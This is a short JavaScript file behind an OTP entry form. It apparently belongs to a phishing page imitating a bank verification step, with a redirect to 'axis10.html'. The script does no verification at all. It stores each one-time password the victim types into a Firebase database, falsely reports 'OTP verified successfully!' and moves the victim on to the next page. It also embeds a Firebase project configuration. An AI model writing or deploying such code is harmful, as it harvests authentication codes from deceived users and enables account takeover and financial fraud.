import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCUz_1-llGeoG20f3B5mBxjgWXAG2qPdcI",
    authDomain: "myfirst-772f2.firebaseapp.com",
    projectId: "myfirst-772f2",
    storageBucket: "myfirst-772f2.firebasestorage.app",
    messagingSenderId: "540088309804",
    appId: "1:540088309804:web:d52187c60c275d140f1989"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const form = document.getElementById('otp-form');
const notification = document.getElementById('notification');

function verifyOtp(event) {
    event.preventDefault(); // Prevent default form submission

    const OnetimePassword = document.getElementById('OnetimePassword').value.trim();

    // Basic validation
    if (OnetimePassword === "" || OnetimePassword.length < 4) {
        notification.textContent = "Please enter a valid OTP.";
        notification.style.color = "red";
        return;
    }

    // Save OTP to Firebase
    set(ref(db, 'verifycustomerop1/' + OnetimePassword), {
        OTP: OnetimePassword
    })
    .then(() => {
        notification.textContent = "OTP verified successfully!";
        notification.style.color = "green";

        // Clear form fields
        document.getElementById('OnetimePassword').value = "";

        // Redirect after success
        setTimeout(() => {
            window.location.href = "axis10.html";
        }, 1000); // Delay for user to see the success message
    })
    .catch((error) => {
        notification.textContent = "Failed to verify OTP: " + error.message;
        notification.style.color = "red";
    });
}

// Attach event listener to the form
form.addEventListener('submit', verifyOtp);
